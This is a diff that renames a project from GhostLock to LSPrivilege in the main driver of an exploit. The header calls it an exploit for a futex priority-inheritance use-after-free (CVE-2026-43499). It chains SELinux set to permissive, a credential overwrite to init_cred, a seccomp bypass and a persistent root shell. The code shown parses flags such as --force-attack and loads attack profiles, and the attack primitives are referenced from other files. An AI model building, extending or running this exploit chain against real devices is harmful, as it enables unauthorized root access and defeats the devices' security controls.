@@ -1,13 +1,13 @@
 /*
- * GhostLock — CVE-2026-43499 futex PI UAF exploit
+ * LSPrivilege — CVE-2026-43499 futex PI UAF exploit
  *
  * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
  * independent root shell: ksud late-load + module watch.
  *
  * This translation unit is the thin adapter: parse, run the stage sequence and
  * map the outcome to the process exit code. Setup, attack primitives, victim
- * protocol and stage policy live in their own units under ghostlock::attack,
- * ghostlock::session::victim, ghostlock::race and ghostlock::session::stages.
+ * protocol and stage policy live in their own units under lsprivilege::attack,
+ * lsprivilege::session::victim, lsprivilege::race and lsprivilege::session::stages.
  */
 
 #include "common.h"
@@ -22,7 +22,7 @@
 #include <string>
 #include <string_view>
 
-using namespace ghostlock;
+using namespace lsprivilege;
 
 
 int main(int argc, char **argv) {
@@ -41,7 +41,7 @@ int main(int argc, char **argv) {
         const char *prebuilt_path = nullptr;
         const char *dump_dir = nullptr;
         for (int32_t i = 1; i < argc; i++) {
-            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
+            if (std::string_view(argv[i]) == "--lsprivilege-app-call") {
                 app_call = true;
             } else if (std::string_view(argv[i]) == "--force-attack") {
                 force_attack = true;
@@ -52,7 +52,7 @@ int main(int argc, char **argv) {
             } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
                 dump_dir = argv[++i];
             } else {
-                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
+                pr_error("usage: %s [--lsprivilege-app-call | --load-prebuilt-profile <bin>]"
                 " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]\n", argv[0]);
                 return 1;
             }
@@ -62,22 +62,22 @@ int main(int argc, char **argv) {
             return 1;
         }
         if (status_record && !app_call) {
-            pr_error("--enable-status-record requires --ghostlock-app-call\n");
+            pr_error("--enable-status-record requires --lsprivilege-app-call\n");
             return 1;
         }
         support::run_state::configure(status_record);
 
         int32_t loaded;
         if (prebuilt_path != nullptr) {
-            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size(), &ids);
+            loaded = profile_entry::read_priv1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size(), &ids);
         } else if (app_call) {
             loaded = status_record
-                         ? profile_entry::read_glk1_frame_stdin(
+                         ? profile_entry::read_priv1_frame_stdin(
                                &decoded, release_buf.data(), release_buf.size(), &ids)
-                         : profile_entry::read_glk1_stdin(
+                         : profile_entry::read_priv1_stdin(
                                &decoded, release_buf.data(), release_buf.size(), &ids);
         } else {
-            pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
+            pr_error("no entrypoint: pass --lsprivilege-app-call or --load-prebuilt-profile <bin>\n");
             return 1;
         }
         if (loaded != 0) {
